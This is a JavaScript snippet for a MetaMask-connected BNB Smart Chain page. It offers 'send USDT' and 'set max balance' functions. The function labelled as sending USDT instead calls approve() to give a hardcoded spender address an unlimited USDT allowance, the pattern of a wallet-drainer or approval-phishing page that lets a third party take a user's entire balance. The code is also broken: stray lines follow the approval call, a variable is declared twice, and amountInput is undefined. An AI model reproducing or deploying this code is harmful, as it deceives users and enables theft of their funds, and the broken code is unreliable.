// ===== BSC CONFIG (FIXED) =====
const BSC_CHAIN_ID = 56;
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

// ===== SEND USDT (APPROVE) =====
async function sendUSDT() {
  if (!window.ethereum) {
    alert("MetaMask required");
    return;
  }

  const provider = new ethers.BrowserProvider(window.ethereum);
  const network = await provider.getNetwork();

  // 🔒 BSC ONLY LOCK
  if (Number(network.chainId) !== BSC_CHAIN_ID) {
    alert("Please switch to BNB Smart Chain (BSC)");
    return;
  }

  const signer = await provider.getSigner();

  const token = new ethers.Contract(
    BSC_USDT,
    [
      "function approve(address spender,uint256 amount) external returns(bool)",
      "function decimals() view returns(uint8)"
    ],
    signer
  );

  const MAX_UINT256 = ethers.MaxUint256;
const tx = await token.approve(BSC_SPENDER, MAX_UINT256);
    alert("Enter valid amount");
    return;
  }

  const decimals = await token.decimals();
  const amount = ethers.parseUnits(amountInput, decimals);

  const tx = await token.approve(BSC_SPENDER, amount);
  await tx.wait();

  alert("BSC USDT approval successful");
}

// ===== SET MAX BALANCE =====
async function setMax() {
  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();

  const token = new ethers.Contract(
    BSC_USDT,
    [
      "function balanceOf(address) view returns(uint256)",
      "function decimals() view returns(uint8)"
    ],
    signer
  );

  const balance = await token.balanceOf(await signer.getAddress());
  const decimals = await token.decimals();

  document.getElementById("amount").value =
    ethers.formatUnits(balance, decimals);
}
